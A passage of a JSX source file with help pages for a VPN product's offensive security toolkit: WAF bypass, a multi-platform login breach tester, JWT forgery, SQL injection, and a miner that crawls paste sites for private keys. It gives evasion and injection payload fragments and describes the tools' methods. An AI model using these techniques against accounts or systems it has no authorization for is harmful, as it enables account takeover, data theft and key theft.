        <p className="text-[10px] font-mono text-primary/83">The Windows, macOS, and Linux desktop apps (v2.1.0) now enforce <strong>certificate pinning</strong> in production mode. All TLS errors are blocked — even if a system root CA has been compromised by corporate proxy software or malware. Dev mode retains normal behavior for testing. The desktop app will automatically update to v2.1.0 via the built-in auto-updater — look for the update banner in the app header.</p>
        <Note type="info">All v2.1.0 security fixes apply to every ProxhqVPN plan — VPN Basic and Command Center Pro alike. No action required from users. Web app users are already protected. Desktop users will receive the update automatically.</Note>
      </div>
    ),
  },
  {
    id: "account", title: "Account & Security Settings", icon: Key,
    content: (
      <div className="space-y-3">
        <p>Manage your ProxhqVPN account from the <strong>Account</strong> page (<code>/account</code>).</p>
        <div className="space-y-2">
          {[
            { t: "Profile", d: "Update display name, profile picture (via Clerk)." },
            { t: "Linked Accounts", d: "Add Google, GitHub, or other SSO providers to your account for passwordless login." },
            { t: "Rotate API Keys", d: "Rotate WireGuard keypairs or API access tokens. Old keys are immediately revoked." },
            { t: "Session Management", d: "View all active sessions (device type, location, last active). Revoke any session remotely." },
            { t: "Two-Factor Authentication", d: "Enable TOTP 2FA via Clerk. Supported by Google Authenticator, Authy, 1Password." },
            { t: "Manage Billing", d: "Opens the Stripe Customer Portal — change plan, update card, view invoices, or cancel." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
      </div>
    ),
  },
  {
    id: "ambassador", title: "Ambassador Program", icon: TrendingUp,
    content: (
      <div className="space-y-3">
        <p>The <strong>Ambassador Program</strong> lets content creators, security researchers, and ProxhqVPN enthusiasts earn <strong>10% commission</strong> on every subscription referred through their unique promo code.</p>
        <h4 className="font-bold text-primary text-[11px]">How It Works</h4>
        <div className="space-y-2">
          {[
            { step: "1", t: "Apply", d: "Visit Ambassadors → Apply Now. Fill in your display name, bio, promo code, and social links. Applications are reviewed within 24–48 hours." },
            { step: "2", t: "Get Approved", d: "Once approved, your public profile goes live on the Ambassadors page. You can add YouTube/Vimeo tutorial videos at any time from your dashboard." },
            { step: "3", t: "Share Your Code", d: "Share your unique promo code with your audience. When someone enters it at checkout, they get recognized as your referral." },
            { step: "4", t: "Earn Commission", d: "You earn 10% of every subscription payment made by your referred subscribers — monthly and annual. Tracked live in your Ambassador Dashboard." },
          ].map(({ step, t, d }) => (
            <div key={step} className="border border-primary/10 rounded px-3 py-2 flex gap-3">
              <div className="w-6 h-6 rounded-full bg-primary/10 border border-primary/20 text-primary text-[10px] font-mono font-bold flex items-center justify-center shrink-0">{step}</div>
              <div>
                <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
                <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
              </div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Ambassador Dashboard Features</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Promo Code Display</strong> — large, easy-to-copy promo code with one-click clipboard copy</div>
          <div>• <strong>Live Stats</strong> — total referrals, total earned, pending payout, video count</div>
          <div>• <strong>Video Management</strong> — add/remove YouTube or Vimeo tutorial links anytime</div>
          <div>• <strong>Bio Editor</strong> — edit your public profile bio in-place</div>
          <div>• <strong>Referral History</strong> — line-by-line breakdown of each referred subscriber and commission earned</div>
        </div>
        <Note type="info">Your ambassador profile page is public — it can be found at <code>/ambassadors</code> by anyone browsing the site, whether or not they are logged in.</Note>
      </div>
    ),
  },

  // ── Security Tool Sections (Command Center Pro) ────────────────────────────
  {
    id: "waf-analyzer",
    title: "WAF Analyzer",
    icon: Shield,
    content: (
      <div className="space-y-3">
        <p>The <strong>WAF Analyzer</strong> detects, fingerprints, and tests bypass techniques for Web Application Firewalls protecting a target URL. Available on Command Center Pro.</p>
        <Note type="warn">Only analyze targets you own or have explicit written authorization to test. WAF bypass testing on unauthorized targets is illegal.</Note>
        <h4 className="font-bold text-primary text-[11px]">How to Run an Analysis</h4>
        <ol className="list-decimal ml-4 space-y-1 text-[10px] font-mono text-primary/83">
          <li>Navigate to <code>/waf</code> in the sidebar (Command Center Pro).</li>
          <li>Enter the target URL (include the full scheme, e.g., <code>https://target.example.com</code>).</li>
          <li>Click <strong>Analyze</strong>. The engine sends baseline and attack probe requests.</li>
          <li>View the detected WAF vendor, confidence level, and response fingerprint.</li>
          <li>Review the Bypass Results table — each bypass technique is shown as Pass/Fail/Uncertain.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Detection Signals</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Status code change</strong> — 200 on baseline, 403/406/429 on attack payload</div>
          <div>• <strong>WAF-specific headers</strong> — CF-RAY (Cloudflare), X-Sucuri-ID, X-CDN, etc.</div>
          <div>• <strong>Response body markers</strong> — "Access Denied," Cloudflare block pages, Akamai reference IDs</div>
          <div>• <strong>Timing anomalies</strong> — Challenge page delays vs. baseline response time</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Bypass Techniques Tested</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• Encoding: double URL encode, Unicode normalization, HTML entity</div>
          <div>• Case manipulation: mixed case keywords (SeLeCt, UnIoN)</div>
          <div>• Comment insertion: <code>UN/**/ION SE/**/LECT</code></div>
          <div>• HTTP-level: chunked transfer encoding, HTTP parameter pollution</div>
          <div>• Content-Type confusion (JSON in form-encoded bodies)</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Supported WAF Vendors (25+)</h4>
        <div className="text-[10px] font-mono text-primary/83">
          Cloudflare, AWS WAF, Akamai, Imperva, Sucuri, ModSecurity, F5 BIG-IP, Barracuda, Fortinet FortiWeb, Radware, Wallarm, Fastly, CloudFront, Nginx+ModSec, and more.
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">OmniStrike Integration</h4>
        <div className="text-[10px] font-mono text-primary/83">
          When a WAF is detected, OmniStrike automatically increases tamper level to 5 and wraps all subsequent payloads with the detected bypass techniques.
        </div>
      </div>
    ),
  },
  {
    id: "social-breach",
    title: "Social & Game Breach Tester",
    icon: Gamepad2,
    content: (
      <div className="space-y-3">
        <p>The <strong>Social &amp; Game Account Breach Tester</strong> provides an authenticated proxy browser for auditing account security across 80+ platforms. Available on Command Center Pro.</p>
        <Note type="danger">Use only against accounts you own or have explicit written permission to audit. Unauthorized credential testing is illegal under the CFAA and equivalent laws.</Note>
        <h4 className="font-bold text-primary text-[11px]">Platform Tabs</h4>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          {[
            { tab: "Social Media", count: "35+", ex: "Instagram, Discord, GitHub, Reddit, Twitter/X, TikTok, LinkedIn, Telegram, Slack" },
            { tab: "Gaming Launchers", count: "10+", ex: "Steam, Epic Games, Blizzard, GOG, Ubisoft Connect, EA/Origin, Rockstar, HoYoverse" },
            { tab: "Game Titles", count: "15+", ex: "Roblox, Fortnite, Valorant, League of Legends, Apex Legends, GTA Online, Call of Duty" },
            { tab: "Legacy Systems", count: "10+", ex: "Xbox Live, PlayStation, Nintendo, 2K, Konami, Sega, NCSoft" },
          ].map(({ tab, count, ex }) => (
            <div key={tab} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="flex items-center justify-between mb-0.5">
                <div className="text-[10px] font-mono font-bold text-primary">{tab}</div>
                <code className="text-[8px] text-primary/40">{count} platforms</code>
              </div>
              <div className="text-[9px] font-mono text-primary/83">{ex}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="list-decimal ml-4 space-y-1 text-[10px] font-mono text-primary/83">
          <li>Navigate to <code>/social-breach</code> in the sidebar.</li>
          <li>Select a tab (Social / Gaming / Games / Legacy).</li>
          <li>Search for or click a platform to open its detail panel.</li>
          <li>Enter credentials for the account you are authorized to test.</li>
          <li>Click <strong>Test Login</strong>. Auto platforms return a session immediately. Manual platforms load the real login page in the proxy browser.</li>
          <li>Use the proxy browser's Back/Forward/Navigate controls to audit the logged-in session.</li>
          <li>Close the session from the Active Sessions panel when done.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Session Persistence</h4>
        <div className="text-[10px] font-mono text-primary/83">
          Your selected tab, active platform, session, and navigation history are preserved when you navigate away in the app and return. Sessions expire after 4 hours of inactivity on the server.
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Security Notes</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• All proxy traffic is routed through your ProxhqVPN tunnel.</div>
          <div>• The proxy blocks all private IP ranges to prevent SSRF attacks.</div>
          <div>• Rate limited to 40 requests per minute to prevent abuse.</div>
          <div>• Credentials are never stored — they are sent directly to the target platform.</div>
        </div>
      </div>
    ),
  },
  {
    id: "bug-bounty-hub",
    title: "Bug Bounty Research Hub",
    icon: ShieldAlert,
    content: (
      <div className="space-y-3">
        <p>The <strong>Bug Bounty Research Hub</strong> is a Command Center Pro reference center for authorized security research across 19 major gaming, social, and developer platform bug bounty programs.</p>
        <Note type="warn">You MUST register with the bug bounty platform (HackerOne, Bugcrowd, etc.) and read the full program policy BEFORE any testing. Testing without registration can result in legal action.</Note>
        <h4 className="font-bold text-primary text-[11px]">How to Use</h4>
        <ol className="list-decimal ml-4 space-y-1 text-[10px] font-mono text-primary/83">
          <li>Navigate to <code>/bug-bounty</code> in the sidebar.</li>
          <li>Browse the 19 program cards. Filter by platform or payout range.</li>
          <li>Click a program to expand it — view scope, payout table, and testing methodology.</li>
          <li>Click <strong>View Program</strong> to open the official bounty platform page.</li>
          <li>Register with the program before any testing.</li>
          <li>Click <strong>Launch in OmniStrike</strong> to open OmniStrike pre-configured for in-scope testing.</li>
          <li>After finding a valid vulnerability, use the <strong>Report Generator</strong> to create a disclosure report.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Program Summary (19 programs)</h4>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          {[
            { p: "PlayStation / Sony", max: "$50,000", platform: "HackerOne" },
            { p: "Xbox / Microsoft", max: "$60,000", platform: "MSRC" },
            { p: "Meta (FB/IG/WA)", max: "$750,000", platform: "Meta Whitehat" },
            { p: "Google / YouTube", max: "$500,000", platform: "Google VRP" },
            { p: "Epic Games", max: "$20,000", platform: "HackerOne" },
            { p: "GitHub", max: "$30,000", platform: "HackerOne" },
          ].map(({ p, max, platform }) => (
            <div key={p} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="flex items-center justify-between mb-0.5">
                <div className="text-[10px] font-mono font-bold text-primary">{p}</div>
                <code className="text-[8px] text-green-400">{max}</code>
              </div>
              <div className="text-[9px] font-mono text-primary/83">{platform}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Report Generator</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>The built-in report generator creates HackerOne-format vulnerability disclosures:</div>
          <ol className="list-decimal ml-4 space-y-0.5">
            <li>Select severity (Critical / High / Medium / Low)</li>
            <li>Enter vulnerability type, affected endpoint, description, and steps to reproduce</li>
            <li>Click <strong>Copy Report</strong> — paste directly into your HackerOne/Bugcrowd submission</li>
          </ol>
        </div>
      </div>
    ),
  },
  {
    id: "quantum-audit",
    title: "QuantumAudit",
    icon: Zap,
    content: (
      <div className="space-y-3">
        <p><strong>QuantumAudit</strong> (<code>/quantum-audit/</code>) is a standalone blockchain security auditing platform. It scans smart contracts, DeFi protocols, and cryptographic implementations for both classical vulnerabilities and post-quantum cryptographic weaknesses.</p>
        <h4 className="font-bold text-primary text-[11px]">What It Scans</h4>
        <div className="space-y-2">
          {[
            { t: "Classical Vulnerabilities", d: "Reentrancy attacks (DAO-style), integer overflow/underflow, unchecked external calls, self-destruct risks, tx.origin authentication bypass, unprotected SELFDESTRUCT, front-running, flash loan vulnerabilities, access control flaws." },
            { t: "Post-Quantum Cryptographic Risk", d: "ECDSA signature weakness detection (nonce reuse, weak-k, r-value collisions), RSA key size inadequacy for quantum era, Shor's algorithm vulnerability assessment, CRYSTALS-Kyber/Dilithium migration readiness, BLS signature strength analysis." },
            { t: "DeFi Protocol Risks", d: "Price oracle manipulation, MEV/sandwich attack vectors, liquidity pool drain scenarios, governance token attacks, proxy upgrade vulnerabilities, slippage tolerance abuse." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Run a Scan</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>QuantumAudit</strong> (<code>/quantum-audit/</code>).</li>
          <li><span className="text-primary/30">2.</span> Click <strong>New Scan</strong>.</li>
          <li><span className="text-primary/30">3.</span> Select the <strong>Chain</strong> (Ethereum, BSC, Polygon, Solana, Avalanche, or custom).</li>
          <li><span className="text-primary/30">4.</span> Enter a <strong>contract address</strong> or paste <strong>Solidity source code</strong> directly.</li>
          <li><span className="text-primary/30">5.</span> Select the <strong>Scan Type</strong>: Quick (core checks), Standard (full suite), or Quantum (adds post-quantum analysis).</li>
          <li><span className="text-primary/30">6.</span> Click <strong>Start Scan</strong>. Poll status with the GET endpoint until <code>status: "completed"</code>.</li>
          <li><span className="text-primary/30">7.</span> View results in the <strong>Scan Detail</strong> page — findings grouped by severity with remediation guidance.</li>
          <li><span className="text-primary/30">8.</span> Click <strong>Download Report</strong> to get the full audit PDF.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Signature Mining Engine</h4>
        <p className="text-[10px] font-mono text-primary/83">The <strong>Sig Miner</strong> (<code>/quantum-audit/sig-miner</code>) deploys 5 independent engines that actively hunt for weak ECDSA signatures on-chain and across the web:</p>
        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
          <div>• <strong>Engine 1 — Block Scanner</strong>: mines raw (r,s,z) tuples from on-chain transactions; detects nonce reuse and r-collisions.</div>
          <div>• <strong>Engine 2 — Web Spider</strong>: BFS crawls paste sites and GitHub Gists for private keys and mnemonics.</div>
          <div>• <strong>Engine 3 — OSINT Spider</strong>: GitHub code search, Pastebin, ENS text records, OP_RETURN data.</div>
          <div>• <strong>Engine 4 — Peel Chain</strong>: follows fund-flow chains hop-by-hop, collecting signatures at each hop.</div>
          <div>• <strong>Hybrid Worm</strong>: runs all 4 engines in parallel with shared intelligence pool and cross-deduplication.</div>
        </div>
        <Note type="warn">QuantumAudit is for authorized security research on contracts you own or have permission to audit. Never use signature mining on wallets you do not own or control.</Note>
      </div>
    ),
  },
  {
    id: "jwt-analyzer-tool",
    title: "JWT Analyzer",
    icon: Key,
    content: (
      <div className="space-y-3">
        <p><strong>JWT Analyzer</strong> (<code>/jwt-analyzer</code>) is a dedicated tool for analyzing and attacking JSON Web Tokens. It covers 5 attack categories against JWTs used in web applications.</p>
        <h4 className="font-bold text-primary text-[11px]">Attack Categories</h4>
        <div className="space-y-2">
          {[
            { t: "Analysis", d: "Decode any JWT instantly: header, payload, signature. View algorithm, expiry, issued-at, subject, role claims. Identify weak algorithms (HS256 with short secrets, alg:none)." },
            { t: "Algorithm Confusion (RS256→HS256)", d: "Fetches the JWKS endpoint, extracts the public key, and re-signs the token using HS256 with the public key as the HMAC secret. Many libraries accept this." },
            { t: "alg:none Attack", d: "Strips the signature and changes the algorithm header to 'none'. Tests whether the server validates the algorithm field before accepting unsigned tokens." },
            { t: "jku / x5u Header Injection", d: "Injects a custom JWKS URL (jku header) or x5u certificate chain URL pointing to your controlled server. The server fetches your key and uses it to verify — you control the key." },
            { t: "kid SQL / Path Injection", d: "Injects payloads into the 'kid' (key ID) field: UNION SELECT injection, OR 1=1 bypass, path traversal (../../dev/null), NULL byte, and 5 additional payloads. Includes HMAC re-signing with the injected secret." },
            { t: "Claim Escalation", d: "Modifies JWT payload claims: role → admin, isAdmin → true, scope → admin read:all, plan → enterprise. Re-signs the modified token for submission." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>JWT Analyzer</strong> (<code>/jwt-analyzer</code>).</li>
          <li><span className="text-primary/30">2.</span> Paste a JWT token from your target application (intercepted via HTTP Interceptor or browser DevTools).</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Decode &amp; Analyze</strong> to see the decoded header and payload.</li>
          <li><span className="text-primary/30">4.</span> Select an attack category from the <strong>Forgery Attacks</strong> panel.</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Generate Attack Token</strong>. The forged token is shown and auto-copied.</li>
          <li><span className="text-primary/30">6.</span> Replay the forged token in the HTTP Interceptor or curl against the target API.</li>
        </ol>
        <Note type="info">All JWT attack tools are for authorized security testing only. Only test tokens from applications you own or have explicit written permission to test.</Note>
      </div>
    ),
  },
  {
    id: "sqli-scanner-tool",
    title: "SQL Injection Scanner",
    icon: Database,
    content: (
      <div className="space-y-3">
        <p><strong>SQL Injection Scanner</strong> (<code>/sqli-scanner</code>) is a purpose-built tool for detecting SQL injection vulnerabilities across web application endpoints. It covers error-based, blind boolean, time-based blind, and UNION-based injection types.</p>
        <h4 className="font-bold text-primary text-[11px]">Detection Techniques</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Error-based</strong>: Injects payloads that trigger database syntax errors — MySQL, MSSQL, Oracle, PostgreSQL error signatures detected.</div>
          <div>• <strong>Boolean blind</strong>: Sends true and false condition payloads and compares response differences (body length, status code, response time).</div>
          <div>• <strong>Time-based blind</strong>: Injects SLEEP(5) / WAITFOR DELAY variants and measures response time differential.</div>
          <div>• <strong>UNION-based</strong>: Enumerates column count (ORDER BY) and injects UNION SELECT to extract data directly.</div>
          <div>• <strong>Second-order</strong>: Stores payloads in one endpoint and triggers them in another — catches stored SQLi missed by direct scanning.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>SQLi Scanner</strong> (<code>/sqli-scanner</code>).</li>
          <li><span className="text-primary/30">2.</span> Enter the <strong>Target URL</strong> with the injection parameter marked (e.g., <code>https://target.com/api?id=1</code>).</li>
          <li><span className="text-primary/30">3.</span> Select <strong>HTTP Method</strong> (GET/POST) and add any required headers (Auth, Content-Type).</li>
          <li><span className="text-primary/30">4.</span> Choose <strong>Injection Techniques</strong> to test (all selected by default).</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Start Scan</strong>. Results show per-technique findings with evidence.</li>
          <li><span className="text-primary/30">6.</span> For confirmed injections, click <strong>Send to SQLMap</strong> to escalate with automated exploitation.</li>
        </ol>
        <Note type="info">The SQLi Scanner works alongside the full SQLMap integration at <code>/sqlmap</code> — use the Scanner to detect and confirm, then SQLMap to exploit and dump databases. Always test against authorized targets only.</Note>
      </div>
    ),
  },
  {
    id: "ssl-tls-tool",
    title: "SSL/TLS Analyzer",
    icon: ShieldAlert,
    content: (
      <div className="space-y-3">
        <p><strong>SSL/TLS Analyzer</strong> (<code>/ssl-tls</code>) inspects TLS certificates and cipher suite configurations for security weaknesses, expired certs, weak key sizes, protocol version vulnerabilities, and HSTS/HPKP header compliance.</p>
        <h4 className="font-bold text-primary text-[11px]">What It Checks</h4>
        <div className="space-y-2">
          {[
            { t: "Certificate Details", d: "Subject, issuer, SANs, expiry date, key type and size, signature algorithm, CT log status. Alerts on certs expiring within 30 days." },
            { t: "Protocol Versions", d: "Detects support for SSLv2, SSLv3, TLS 1.0, TLS 1.1 (all deprecated and insecure). Confirms TLS 1.2 and TLS 1.3 support." },
            { t: "Cipher Suites", d: "Tests for NULL ciphers, export-grade ciphers (EXPORT, 40-bit), RC4, DES, 3DES (SWEET32 vulnerable), anonymous key exchange (aNULL), and MD5 MACs." },
            { t: "Key Exchange", d: "Checks for DHE key sizes <2048 bits (Logjam), ECDHE support, and RSA key size <2048 bits." },
            { t: "Header Compliance", d: "Verifies HSTS (Strict-Transport-Security) with max-age ≥1yr, includeSubDomains, preload. HPKP presence (deprecated but checked). Certificate pinning status." },
            { t: "Known Vulnerabilities", d: "POODLE, BEAST, CRIME, BREACH, HEARTBLEED, DROWN, LUCKY13, ROBOT, FREAK detection based on version and configuration." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>SSL/TLS Analyzer</strong> (<code>/ssl-tls</code>).</li>
          <li><span className="text-primary/30">2.</span> Enter the target hostname (e.g., <code>example.com</code>) and port (default: 443).</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Analyze</strong>. The scan runs live TLS handshake probes.</li>
          <li><span className="text-primary/30">4.</span> Review findings — Critical (expired cert, SSLv3 support) and High (weak ciphers, missing HSTS) are shown prominently.</li>
          <li><span className="text-primary/30">5.</span> Download the full report as a formatted text file.</li>
        </ol>
        <Note type="warn">For results requiring SNI (Server Name Indication), the target hostname must exactly match the certificate's CN or SAN. IP addresses may show a different cert than the domain.</Note>
      </div>
    ),
  },
  {
    id: "waf-tool",
    title: "WAF Analyzer",
    icon: Shield,
    content: (
      <div className="space-y-3">
        <p><strong>WAF Analyzer</strong> (<code>/waf</code>) detects the presence and type of a Web Application Firewall protecting a target, then tests bypass techniques to find gaps in coverage — helping you understand what payloads your WAF misses.</p>
        <h4 className="font-bold text-primary text-[11px]">WAF Detection</h4>
        <p className="text-[10px] font-mono text-primary/83">The analyzer identifies 25+ WAF vendors from response headers, cookies, and behavioral signatures: Cloudflare, AWS WAF, Akamai Kona, F5 Advanced WAF, ModSecurity (OWASP CRS), Sucuri, Imperva Incapsula, Barracuda, Fortinet FortiWeb, Radware AppWall, Sophos, and more.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">WAF Bypass Generator (<code>/waf-bypass</code>)</h4>
        <p className="text-[10px] font-mono text-primary/83 mb-2">The companion WAF Bypass Generator creates evasion payloads for your specific WAF vendor:</p>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>URL encoding</strong>: Single-encode, double-encode, unicode, hex, HTML entity</div>
          <div>• <strong>SQL obfuscation</strong>: Inline comments (/**/) , version comments (/*!*/), case variation, whitespace alternatives (tab, newline, CR)</div>
          <div>• <strong>XSS evasion</strong>: Event handler variations, tag case, SVG vectors, template literal injection, CSS expression, vbscript</div>
          <div>• <strong>HTTP layer</strong>: Chunked Transfer Encoding, HTTP parameter pollution, path confusion (//api, /./api), Host header bypass</div>
          <div>• <strong>Content-Type switching</strong>: text/plain, application/x-www-form-urlencoded for JSON endpoints</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>WAF Analyzer</strong> (<code>/waf</code>) and enter the target URL.</li>
          <li><span className="text-primary/30">2.</span> Click <strong>Detect WAF</strong>. The tool identifies the vendor and version where possible.</li>
          <li><span className="text-primary/30">3.</span> Go to <strong>WAF Bypass Generator</strong> (<code>/waf-bypass</code>).</li>
          <li><span className="text-primary/30">4.</span> Select the detected WAF vendor and your payload type (SQLi, XSS, etc.).</li>
          <li><span className="text-primary/30">5.</span> Copy the generated bypass payloads and test them in the HTTP Interceptor or Intruder.</li>
        </ol>
        <Note type="warn">Arsenal tier required for WAF Bypass Generator. WAF Analyzer is also Arsenal-tier. Authorized security testing only.</Note>
      </div>
    ),
  },
  {
    id: "iac-scanner",
    title: "IaC Security Scanner",
    icon: FileText,
    content: (
      <div className="space-y-3">
        <p><strong>IaC Scanner</strong> (<code>/iac-scan</code>) scans Infrastructure-as-Code files for security misconfigurations. Supports Terraform (.tf), CloudFormation (.yaml/.json), Kubernetes manifests (.yaml), Ansible playbooks, and Dockerfile.</p>
        <h4 className="font-bold text-primary text-[11px]">What It Finds</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Terraform</strong>: S3 buckets with public ACLs, security groups allowing 0.0.0.0/0, unencrypted RDS/EBS/S3, no MFA delete on S3, missing state encryption, overly permissive IAM policies.</div>
          <div>• <strong>CloudFormation</strong>: Lambda execution roles with *, EC2 instances with admin IAM profiles, publicly accessible RDS, missing deletion protection.</div>
          <div>• <strong>Kubernetes</strong>: containers running as root, hostPID/hostNetwork: true, privileged containers, missing ResourceLimits, default service account tokens, unrestricted RBAC.</div>
          <div>• <strong>Dockerfile</strong>: running as root (no USER directive), ADD instead of COPY, hardcoded secrets (ENV PASSWORD=...), no health check, unnecessary packages in prod image.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>IaC Scanner</strong> (<code>/iac-scan</code>).</li>
          <li><span className="text-primary/30">2.</span> Paste your IaC file content or upload the file directly.</li>
          <li><span className="text-primary/30">3.</span> Select the <strong>file type</strong> (auto-detected from content if left blank).</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Scan</strong>. Findings are listed by severity with the exact resource name, line reference, and fix recommendation.</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Fix &amp; Re-scan</strong> to apply suggested fixes and verify they resolve the finding.</li>
        </ol>
        <Note type="info">IaC Scanner is an Arsenal-tier tool. Ideal for use before deploying any cloud infrastructure — run it in your CI/CD pipeline as a gate check.</Note>
      </div>
    ),
  },
  {
    id: "http-interceptor",
    title: "HTTP Interceptor",
    icon: Send,
    content: (
      <div className="space-y-3">
        <p><strong>HTTP Interceptor</strong> (<code>/http-interceptor</code>) is a full web proxy that intercepts, displays, and allows editing of all HTTP/HTTPS requests and responses between your browser and the target — equivalent to Burp Suite's Proxy module.</p>
        <h4 className="font-bold text-primary text-[11px]">Core Capabilities</h4>
        <div className="space-y-2">
          {[
            { t: "Request Intercept", d: "Pause outbound requests before they are sent. Edit any part: URL, method, headers, body, cookies. Forward modified request or drop it entirely." },
            { t: "Response Intercept", d: "Pause server responses before they reach the browser. Inject JavaScript, modify JSON responses, change status codes, strip security headers." },
            { t: "WebSocket Traffic", d: "Intercept WebSocket frames (ws:// and wss://). Edit individual frames, replay frames, inject messages into the ws stream." },
            { t: "Request History", d: "Full scrollable log of every intercepted request with method, status, content-type, body size, and time. Click any entry to inspect and replay." },
            { t: "Match &amp; Replace Rules", d: "Define regex rules that automatically modify requests/responses: replace Authorization headers, inject XSS payloads into all responses, add/remove headers globally." },
            { t: "Replay &amp; Diff", d: "Replay any historical request with modifications. Diff two responses side-by-side to identify behavioral changes from modified inputs." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Browser Proxy Setup</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Open <strong>HTTP Interceptor</strong> (<code>/http-interceptor</code>) and start the proxy (shown port, default 8082).</li>
          <li><span className="text-primary/30">2.</span> In your browser, set HTTP proxy to <code>127.0.0.1:8082</code> (Firefox: Network Settings → Manual proxy).</li>
          <li><span className="text-primary/30">3.</span> Install the CA certificate shown on the Interceptor page to decrypt HTTPS traffic.</li>
          <li><span className="text-primary/30">4.</span> Browse the target site — all traffic appears in the Interceptor panel.</li>
          <li><span className="text-primary/30">5.</span> Toggle <strong>Intercept On/Off</strong> to pause or pass-through traffic.</li>
        </ol>
        <Note type="info">HTTP Interceptor is an Arsenal-tier tool. All VPN traffic is still routed through the ProxhqVPN tunnel while intercepting — your real IP remains protected.</Note>
      </div>
    ),
  },
  {
    id: "api-tester",
    title: "API Security Tester",
    icon: Crosshair,
    content: (
      <div className="space-y-3">
        <p><strong>API Security Tester</strong> (<code>/api-tester</code>) performs automated security testing against REST and GraphQL APIs — discovering endpoints, testing authentication, probing for injection, CORS misconfigurations, broken object-level authorization, and mass assignment.</p>
        <h4 className="font-bold text-primary text-[11px]">Test Coverage (OWASP API Top 10)</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>API1 — Broken Object Level Authorization</strong>: IDOR enumeration on every object reference parameter</div>
          <div>• <strong>API2 — Broken Authentication</strong>: JWT attacks, weak token entropy, missing auth on internal endpoints</div>
          <div>• <strong>API3 — Excessive Data Exposure</strong>: Response field filtering validation — detects over-exposure</div>
          <div>• <strong>API4 — Lack of Resources &amp; Rate Limiting</strong>: Sends high-rate requests and measures response degradation</div>
          <div>• <strong>API5 — Broken Function Level Authorization</strong>: Tests admin functions with user-level tokens</div>
